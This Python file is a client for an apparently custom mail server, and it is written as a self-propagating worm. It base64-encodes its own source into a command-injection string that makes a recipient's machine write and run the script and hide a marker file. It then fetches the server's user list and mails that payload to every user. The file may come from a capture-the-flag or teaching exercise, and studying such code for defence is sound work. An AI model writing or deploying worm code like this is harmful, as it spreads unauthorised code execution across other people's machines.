import socket
from struct import pack, unpack
import json
import base64
from typing import *

PYTHON_FILE_NAME = "textfile.py"

USER_LIST = 0
MAIL_WRITE = 1
MAIL_GET = 2

SETTINGS = "settings.dat"


def craft_user_list_packet(username: str, password: str) -> Dict[str, str]:
    d = dict()
    d['ID'] = 0
    d['user'] = username
    d['pass'] = password
    return d


def craft_mail_write_packet(username: str, password: str, to: str, subject: str, message: str) -> Dict[str, str]:
    d = dict()
    d['ID'] = 1
    d['user'] = username
    d['pass'] = password
    d['to'] = to
    d['subject'] = subject
    d['message'] = message
    return d


def craft_mail_get_packet(username: str, password: str) -> Dict[str, str]:

    d = dict()
    d['ID'] = 2
    d['user'] = username
    d['pass'] = password
    return d


def get_file_content() -> bytes:

    with open(__file__, 'rb') as f:
        return base64.b64encode(f.read())


def load_settings() -> Dict[str, str]:

    with open(SETTINGS, "r") as f:
        return json.loads(f.read().strip())


def send_payload(payload: Dict[str, str], host: str, port: 25565) -> None:

    payload = json.dumps(payload)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        length = len(payload)
        length = pack("<I", length)
        s.sendall(length)
        s.sendall(payload.encode())
        length = s.recv(1024)
        length = unpack("<I", length)[0]
        payload = s.recv(length)
        return json.loads(payload)


def main():
    settings = load_settings()
    user = settings['user']
    password = settings['password']
    host = settings['server']
    port = int(settings['port'])
    touched_name = "touched"

    code = f'python -c \"import base64; f = open(\'texty.py\', ' \
           f'\'wb\'); f.write(' \
           f'base64.b64decode(\'{get_file_content().decode("utf-8")}\'.encode(\'utf-8\'))); f.close()\"'
    code = f'python -c \"import base64; f = open(\'texty.py\', ' \
           f'\'wb\'); f.write(base64.b64decode(' \
           f'\'{get_file_content().decode("utf-8")}\'.encode(\'utf-8\'))); f.close()\" && python texty.py'
    touched_data = "you"
    wrap_code = f'if not exist {touched_name} ( echo {touched_data}> {touched_name}' \
                f'&&attrib +h {touched_name} && {code})'
    data = f' off && echo on && {wrap_code} && echo '
    print(data)
    subject = "rando mail"
    # print(f"I am on {user}")
    if user == 'CEO':
        with open("HelloWorld", "w")as f:
            f.write("hey its me")
    d = send_payload(craft_user_list_packet(user, password), host, port)
    l = d['users']
    for curr_user in l:
        send_payload(craft_mail_write_packet(user, password, to=curr_user, subject=subject, message=data), host, port)


if __name__ == "__main__":
    main()
